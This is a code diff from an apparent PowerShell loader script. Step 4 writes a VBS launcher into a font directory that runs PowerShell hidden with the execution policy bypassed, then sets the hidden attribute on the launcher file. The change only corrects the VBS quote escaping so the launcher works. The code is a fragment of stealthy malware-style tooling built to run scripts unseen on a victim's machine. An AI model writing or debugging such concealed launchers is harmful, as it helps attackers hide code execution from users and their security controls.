@@ -61,9 +61,10 @@ Write-Output "[+] Created launcher with cleanup: $launcherPath"
 
 # --- 4. Create VBS launcher (completely invisible) ---
 $vbsPath = "$fontDir\run.vbs"
+# Correct VBS syntax: double quotes inside the string are escaped by doubling them.
 $vbsContent = @"
 Set WshShell = CreateObject("WScript.Shell")
-WshShell.Run "powershell.exe -NoProfile -ExecutionPolicy Bypass -File `"$launcherPath`"", 0, False
+WshShell.Run "powershell.exe -NoProfile -ExecutionPolicy Bypass -File ""$launcherPath""", 0, False
 "@
 Set-Content -Path $vbsPath -Value $vbsContent -Encoding ASCII -Force
 attrib +h $vbsPath
